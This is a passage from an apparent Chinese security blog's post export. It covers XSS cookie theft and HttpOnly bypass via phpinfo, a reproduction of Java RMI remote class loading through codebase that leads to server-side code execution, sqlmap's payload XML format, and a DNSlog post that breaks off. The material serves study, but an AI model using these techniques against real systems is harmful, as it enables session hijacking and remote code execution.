    <content><![CDATA[<h1 id="XSS-和-http-only-绕过"><a href="#XSS-和-http-only-绕过" class="headerlink" title="XSS 和 http only 绕过"></a>XSS 和 http only 绕过</h1><h3 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h3><p><a href="https://www.ddosi.org/bypassing-httponly/">https://www.ddosi.org/bypassing-httponly/</a></p>
<span id="more"></span>


<p>一个简单的密码认证场景。前端输入密码，后端判断密码后跳转到管理页面。  </p>
<p>text.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;aaaa/login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名:</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name = <span class="string">&quot;username&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">    密码</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>  &gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]==<span class="string">&quot;123&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]==<span class="string">&quot;123&quot;</span>) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">        header(<span class="string">&quot;Location: admin.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;密码错误 , 点击此处&lt;a href =&quot;../text.php&quot;&gt;重新登录&lt;/a&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">测试</span><br></pre></td></tr></table></figure>

<p>admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;欢迎进入系统&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;未登录 , 点击此处&lt;a href =&quot;../text.php&quot;&gt;重新登录&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当用户在login.php中验证成功时，php设置<code>session[&#39;admin&#39;]==true</code>。在admin.php中，php通过cookie<code>PHPSESSID=**</code>找到对应文件。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228152852.png"><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228152920.png">    </p>
<p>通过文件中的对应属性来判断当前用户是否登录，以实现权限控制。   </p>
<p>现在cookie的设置域名为<code>localhost</code>，路径为<code>/</code>。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228153858.png"> </p>
<p>这意味着只要在<code>localhost</code>的域名中，http请求头中都会附带<code>PHPSESSID=**</code>的信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228154035.png">  </p>
<p>此时如果使用js代码<code>document.cookie</code>同样可以获得cookie信息。</p>
<p>通过XSS漏洞，获得cookie信息即可同样以管理员身份登录后台。</p>
<p>如果系统设置cookie 的 http only 选项为 true。这时无法通过js文件查看cookie文件,同时在控制台输入<code>documenet.cookie</code>也无法获得cookie信息。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228160345.png"></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228160402.png">  </p>
<h3 id="phpinfo获得cookie"><a href="#phpinfo获得cookie" class="headerlink" title="phpinfo获得cookie"></a>phpinfo获得cookie</h3><p>就算cookie设置了http only。如果phpinfo页面符合cookie对应的路径，phpinfo会显示对应的cookie信息。  </p>
<p>  <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220228160717.png">  </p>
<h3 id="通过发送请求附带cookie"><a href="#通过发送请求附带cookie" class="headerlink" title="通过发送请求附带cookie"></a>通过发送请求附带cookie</h3><p>js不能直接获得cookie信息，但是可以向符合cookie路径信息的网站构造请求。如何cookie路径的请求会附带cookie信息。</p>
]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>http-only</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA安全漫谈-RMI篇-笔记</title>
    <url>/2022/03/02/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="JAVA安全漫谈-RMI篇-笔记"><a href="#JAVA安全漫谈-RMI篇-笔记" class="headerlink" title="JAVA安全漫谈-RMI篇 笔记"></a>JAVA安全漫谈-RMI篇 笔记</h1><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<span id="more"></span>

<h3 id="RMI-基本流程"><a href="#RMI-基本流程" class="headerlink" title="RMI 基本流程"></a>RMI 基本流程</h3><p>JAVA中RMI，可以使JAVA远程调用另外的远程端中的JAVA方法。</p>
<p>下面是一个简单的例子:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//RMIServer.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.System.getProperty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//接口包含需要远程调用的函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实现接口的类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">REmoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">REmoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello WOrld&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建Registry, 将实例化的类绑定在对应地址</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(getProperty(<span class="string">&quot;java.home&quot;</span>));</span><br><span class="line">        REmoteHelloWorld h = <span class="keyword">new</span> REmoteHelloWorld();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建并运行RMI Registry</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将对象绑定在Hello这个名字上</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.2:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>RMIServer 有三个部分:</p>
<ul>
<li>一个接口</li>
<li>一个实现接口的类</li>
<li>一个用于实现Registry并绑定类与地址</li>
</ul>
<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://127.0.0.2:1099/Hello&quot;</span>);</span><br><span class="line">        String ret = hello.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端使用<code>Naming.lookup()</code>在服务端绑定的对应地址，获得对应的接口，之后就可以正常使用。 需要注意的是你使用获得的远程接口的方法，是将对应数据序列化之后给服务端运行。本质上是在服务器上运行相应的代码。  </p>
<p>如果我们使用Wireshark抓包可以发现RMI的连接流程 ，有两次TCP握手。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220302194848.png"></p>
<p>第一次是本地55315向远程1099端口发起连接。第二次本地55316端口向远程54762端口发起连接。</p>
<p>选择序号996号数据包:ReturnData.可以发现在返回地址10.1.1.1后面4个字节<code>00 00 d5 ea</code>转为10进制为55316。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220302195327.png"></p>
<p>整个流程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据<br>流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 10.1.1.1:55316，于是再与这个地址建⽴TCP连接。在这个过程中将数据送给远程服务器，在服务器进行处理。之后服务器将数据返回客户端。</p>
<h3 id="RMI-利用codebase执行任意代码"><a href="#RMI-利用codebase执行任意代码" class="headerlink" title="RMI 利用codebase执行任意代码"></a>RMI 利用codebase执行任意代码</h3><p>在JAVA运行过程中如果指定了<code>codebase</code>，当在RMI数据传递的过程中如果RMI服务端没用发现对应的类，而且在本地<code>CLASSPATH</code>没有，就会到远程加载对应的类。  </p>
<p>在RMI运行的过程中，客户端是可以指定<code>codebase</code>的。如果服务端配置了<code>SevurityManager</code>并且<code>java.rmi.server.useCodebaseOnly=false</code>。那么当客户端将一个不在服务端的类作为调用远程方法的参数传递给服务端，服务端会到客户端设置的<code>codebase</code>地址去加载对应的类。</p>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>建立四个文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ICalc</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">Integer sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">sum += param;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteRMIServer</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">System.setSecurityManager(<span class="keyword">new</span> SecurityManager());</span><br><span class="line">&#125;</span><br><span class="line">Calc h = <span class="keyword">new</span> Calc();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">new</span> RemoteRMIServer().start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>编译并运行:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.hostname=127.0.0.2 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>

<p>在另一个位置建立一个客户端，同时配置好服务端对应的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ICalc r = (ICalc)</span><br><span class="line">Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/refObj&quot;</span>);</span><br><span class="line">List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">li.add(<span class="number">3</span>);</span><br><span class="line">li.add(<span class="number">4</span>);</span><br><span class="line">System.out.println(r.sum(li));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行Client<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220302091635.png"></p>
<p>会发生错误找不到对应的类RMIclient$Payload</p>
<p>这个时候我们检查服务器日志可以发现存在对RMIClient$Payload.class的请求。说明如果服务器存在恶意类，服务端会调用并运行。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220302091450.png">  </p>
<p>通过Wireshark抓包可以发现经过两次TCP连接后，客户端向服务端发送了<code>codebase</code>相关的信息。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220302201852.png">  </p>
<p>在复现的时候我用<code>powershell</code>运行<code>JAVA -D</code>，怎末都无法运行换回<code>cmd</code>就好了，搞了我一个晚上。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap-自定义Payload</title>
    <url>/2022/03/03/Sqlmap-%E8%87%AA%E5%AE%9A%E4%B9%89Payload/</url>
    <content><![CDATA[<h1 id="Sqlmap-自定义-Payload"><a href="#Sqlmap-自定义-Payload" class="headerlink" title="Sqlmap 自定义 Payload"></a>Sqlmap 自定义 Payload</h1><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/">http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/</a></p>
<p><a href="https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html">https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html</a></p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><h4 id="程序调用流程"><a href="#程序调用流程" class="headerlink" title="程序调用流程"></a>程序调用流程</h4><p>Sqlmap 在  <code>sqlmap.py -&gt; main -&gt; init() -&gt; loadPayloads()</code>中读取 <code>/data/xml/payloads</code>中的六种注入方法的<code>payload</code>。然后在<code>sqlmap.py-&gt; main - &gt; start() - &gt; checkSqlInjection() -&gt; test = getSortedInjectionTests()</code>调用。然后进入<code>while tests:</code>循环每一种<code>payload</code>。</p>
<span id="more"></span>

<h4 id="payload规则"><a href="#payload规则" class="headerlink" title="payload规则"></a>payload规则</h4><h5 id="payload结构"><a href="#payload结构" class="headerlink" title="payload结构"></a>payload结构</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">stype</span>&gt;</span><span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">level</span>&gt;</span><span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">risk</span>&gt;</span><span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">clause</span>&gt;</span><span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">where</span>&gt;</span><span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">vector</span>&gt;</span><span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">payload</span>&gt;</span><span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">char</span>&gt;</span><span class="tag">&lt;/<span class="name">char</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">columns</span>&gt;</span><span class="tag">&lt;/<span class="name">columns</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">comparison</span>&gt;</span><span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">grep</span>&gt;</span><span class="tag">&lt;/<span class="name">grep</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">time</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">union</span>&gt;</span><span class="tag">&lt;/<span class="name">union</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dbms</span>&gt;</span><span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dbms_version</span>&gt;</span><span class="tag">&lt;/<span class="name">dbms_version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">os</span>&gt;</span><span class="tag">&lt;/<span class="name">os</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="payload解释"><a href="#payload解释" class="headerlink" title="payload解释"></a>payload解释</h5><p><test>  根节点<br>    <title>(String)payload标题 </title><br>    <stype> (1- 6)<br>        Sql注入类型<br>        1:布尔盲注<br>        2: 错误注入<br>        3:内联查询<br>        4:堆叠查询<br>        5:时间盲注<br>        6:联合查询<br>    </stype><br>    <level>(1-5)当注入设置的level  &lt;该 level 时 ，不执行当前 payload<br>        1:一定测试 (小于100条测试)<br>        2:a bit harder (100-200 测试)<br>        3: 默认设置数值(200 - 500 测试)<br>        4: 大量测试 (500 - 1000 测试)<br>        5: 花费大量的时间( &gt; 1000 测试)<br>    </level><br>    <risk>(1-3)会对数据库数据完整性有影响<br>        1 : 低风险<br>        2: 中风险<br>        3: 高风险<br>    <risk><br>    <clause>payload在那里生效<br>            0: Always<br>            1: WHERE / HAVING<br>            2: GROUP BY<br>            3: ORDER BY<br>            4: LIMIT<br>            5: OFFSET<br>            6: TOP<br>            7: Table name<br>            8: Column name<br>            9: Pre-WHERE (non-query)<br>               可以是一个以逗号分隔的序列<br>    </clause><br>    <where>(1 - 3)将payload以何种方式加到参数后面<br>        1: 将paylaod添加到参数后<br>        2:将参数值替换为随机负数后，添加到负数后<br>        3:将参数替换为payload<br>    </where><br>    <vector>(STRING) 标识exp是什么，在实际注入过程无影响  </vector><br>    <request>payload主体<br>        <paylaod>(string) payload<payload><br>        <comment>(string) 注释在 <code>suffix</code>之前 </comment><br>        <char>在联合查询中用来爆破<code>columns</code>的字符</char><br>        <columns>联合查询中 <code>columns</code>的范围</columns><br>    </request><br>    <response>如何定义 是否注入成功<br>        <comparison>(String)用于判断<code>bool盲注</code>是否成功<br>            将这个作为<code>&lt;payload&gt;</code>重新发送，判断与原先的<code>response</code>是否相同。<br>        </comparison><br>        <grep>用正则判断<code>response</code>是否含有。用于判断<code>错误注入</code></grep><br>        <time>在返回<code>response</code>前等待的时间。判断<code>时间盲注``堆叠查询</code></time><br>        <union>Calls unionsTest()函数。判断<code>联合查询</code></union><br>    </response><br>    <details>细节判断注入是否成功<br>        <dbms>数据库类型</dbms><br>        <dbms_version>数据库版本</dbms_version><br>        <os>操作系统版本</os><br>    </details><br></test></p>
<h5 id="固定参数"><a href="#固定参数" class="headerlink" title="固定参数"></a>固定参数</h5><p>[RANDNUM] [RANDNUM1] 随机整数<br>[INFERENCE]<br>[ORIGVALUE] 参数原来的值<br>[DELIMITER_START] 随机字串作为分隔符开始<br>[DELIMITER_STOP]  随机字串作为分隔符开始<br>[RANDSTR] 随机字符串</p>
<h3 id="Boundary"><a href="#Boundary" class="headerlink" title="Boundary"></a>Boundary</h3><h4 id="程序调用流程-1"><a href="#程序调用流程-1" class="headerlink" title="程序调用流程"></a>程序调用流程</h4><p>在Payload调用流程的相邻,有函数<code>loadBoundaries</code>。XML文件位于/data/xml/boundaries.xml</p>
<p>在payload的<code>while</code>循环中，有一个<code>for</code>循环将所有 boundary遍历，与paylaod组合。</p>
<h4 id="boundary规则"><a href="#boundary规则" class="headerlink" title="boundary规则"></a>boundary规则</h4><h5 id="boundary解释"><a href="#boundary解释" class="headerlink" title="boundary解释"></a>boundary解释</h5><boundary>
    <level>与`payload`相同<level>
    <clause>与`payload`配合使用. `boundary`与`paylaod`的`clause`需要有并集</clause>
    <where>与`payload`配合使用. `boundary`与`paylaod`的`where`需要有并集</where>
    <ptype>(1-6)标识字符类型，注入过程 `应该` 不使用
            1: Unescaped numeric
            2: Single quoted string
            3: LIKE single quoted string
            4: Double quoted string
            5: LIKE double quoted string
            6: Identifier (e.g. column name)
    </ptype>
    <prefix>(String) 添加在 `<paylaod>`前的前缀</prefix>
    <suffix>(String) 添加在`<comment>`后的后缀</suffix>
</boundary>







<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><ul>
<li> 循环每一个<code>payload</code></li>
<li>  if (payload.risk &gt; conf.risk || payload.level &gt; conf.level) cotinue</li>
<li>  循环每一个<code>boundary</code></li>
<li>  if ( boundary.level &gt; conf.level  ) continue</li>
<li>  如果 <code>payload.clause</code> 和 <code>boundary.clause</code>并集为空，且 payload.clause!=0 且 boundary.clause!=0 cotinue</li>
<li>  如果<code>paylaod.where</code> 和  <code>boundary.where</code>为空 continue</li>
<li> payload = prefix + paylaod + comment + suffix      </li>
</ul>
<p>如果要使payload生效使主要需要注意:<br>paylaod.risk , payload.level , boundary.level, boundary.risk,<br>payload.clause 和 boundary.clause 有并集, payload.where 和 boundary.where 需要并集  </p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3>]]></content>
      <categories>
        <category>注入</category>
      </categories>
      <tags>
        <tag>Sqlmap</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>dnslog利用</title>
    <url>/2022/03/04/dnslog%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="DNSlog利用"><a href="#DNSlog利用" class="headerlink" title="DNSlog利用"></a>DNSlog利用</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Xy--1/p/12896599.html">https://www.cnblogs.com/Xy--1/p/12896599.html</a></p>
<h2 id="DNSlog是什么"><a href="#DNSlog是什么" class="headerlink" title="DNSlog是什么"></a>DNSlog是什么</h2><p>DNS是域名服务器，用于将域名解析为ip。DNS log自然就是DNS服务器的解析历史日志记录。</p>
